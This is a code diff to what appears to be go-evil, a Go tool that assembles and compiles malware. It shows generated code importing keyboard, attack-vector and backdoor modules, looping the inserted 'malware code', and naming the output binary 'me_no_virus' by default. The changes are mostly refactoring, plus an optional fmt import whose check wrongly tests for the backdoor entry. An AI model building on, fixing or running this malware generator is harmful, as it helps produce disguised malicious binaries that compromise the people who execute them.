@@ -30,6 +30,7 @@ const (
 	keyboard      = "\tkeyboard \"github.com/s9rA16Bf4/go-evil/domains/keyboard\""
 	attack_vector = "\tattack \"github.com/s9rA16Bf4/go-evil/domains/attack_vector\""
 	backdoor      = "\tback \"github.com/s9rA16Bf4/go-evil/domains/backdoor\""
+	fmt_          = "\"fmt\""
 
 	// Related to webview
 	loader_x86 = "https://github.com/webview/webview/raw/master/dll/x86/WebView2Loader.dll"
@@ -71,6 +72,11 @@ func Append_domain(domain string) {
 			notify.Log("Adding domain 'backdoor'", notify.Verbose_lvl, "2")
 			domains = append(domains, backdoor)
 		}
+	case "fmt":
+		if !find(backdoor) {
+			notify.Log("Adding library 'fmt'", notify.Verbose_lvl, "2")
+			domains = append(domains, fmt_)
+		}
 	}
 }
 
@@ -98,14 +104,14 @@ func Write_file() {
 		"package main",
 		"import (",
 	}
-	base_code = append(base_code, domains...)                  // Which domains to include
-	base_code = append(base_code, ")", "func main(){")         // Main function and closing include tag
-	base_code = append(base_code, "for {")                     // While loop
-	base_code = append(base_code, mal.Malware_getContent()...) // Insert the malware code
-	base_code = append(base_code, "}}")                        // And insert the end
+	base_code = append(base_code, domains...)          // Which domains to include
+	base_code = append(base_code, ")", "func main(){") // Main function and closing include tag
+	base_code = append(base_code, "for {")             // While loop
+	base_code = append(base_code, mal.GetContent()...) // Insert the malware code
+	base_code = append(base_code, "}}")                // And insert the end
 
-	if mal.Malware_getName() == "" {
-		mal.Malware_setBinaryName("me_no_virus")
+	if mal.GetName() == "" {
+		mal.SetBinaryName("me_no_virus")
 	}
 
 	file, _ := os.Create("output/temp.go") // We utilize a temp directory
@@ -130,11 +136,11 @@ func Read_file(file string) string {
 }
 
 func Compile_file() {
-	if runtime.GOOS == "windows" && mal.Malware_getExtension() == "" {
-		mal.Malware_setExtension(".exe") // Apparently golang on windows doesn't do this automatically
+	if runtime.GOOS == "windows" && mal.GetExtension() == "" {
+		mal.SetExtension(".exe") // Apparently golang on windows doesn't do this automatically
 		notify.Log("Setting .exe extension on the target file", notify.Verbose_lvl, "3")
 	}
-	arg := "build -o output/" + mal.Malware_getName() + mal.Malware_getExtension() + " output/temp.go"
+	arg := "build -o output/" + mal.GetName() + mal.GetExtension() + " output/temp.go"
 	cmd := exec.Command("go", strings.Split(arg, " ")...)
 	notify.Log("Compiling malware", notify.Verbose_lvl, "1")
 
